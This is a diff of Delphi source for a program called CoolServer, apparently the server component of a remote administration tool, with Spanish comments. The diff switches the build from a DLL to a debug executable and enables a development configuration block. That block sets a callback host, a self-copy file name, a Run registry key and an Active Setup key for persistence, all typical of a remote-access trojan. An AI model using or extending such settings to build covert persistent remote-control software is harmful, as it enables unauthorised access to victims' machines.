@@ -17,8 +17,8 @@
 {$define CommDebug}
 {$define DevConfig}
 
-library CoolServer; //Para crear el server definitivo que colocaremos en %cooldir%/cliente/recursos/coolserver.dll
-//program CoolServer; //Para debug, más lineas "Para debug" abajo
+//library CoolServer; //Para crear el server definitivo que colocaremos en %cooldir%/cliente/recursos/coolserver.dll
+program CoolServer; //Para debug, más lineas "Para debug" abajo
 uses
   Windows,
   SysUtils,
@@ -1399,9 +1399,9 @@ end;
 exports CargarServidor;
 
 begin
-  {
-  VersionDelServer := 'DEBUG';
-  Configuracion.sHosts                 := 'localhost:80¬';
+  {$ifdef DevConfig}
+  VersionDelServer                      := '';
+  Configuracion.sHosts                  := 'localhost:3360¬';
   Configuracion.sID                     := 'Coolserver';
   Configuracion.bCopiarArchivo          := False; //Me copio o no?
   Configuracion.sFileNameToCopy         := 'coolserver.exe';
@@ -1412,7 +1412,8 @@ begin
   Configuracion.sRunRegKeyName          := 'Coolserver';
   Configuracion.bArranqueActiveSetup    := False;
   Configuracion.sActiveSetupKeyName     := 'blah-blah-blah-blah';
+
   CargarServidor(@configuracion);
-  }
+  {$endif}
 end.
 
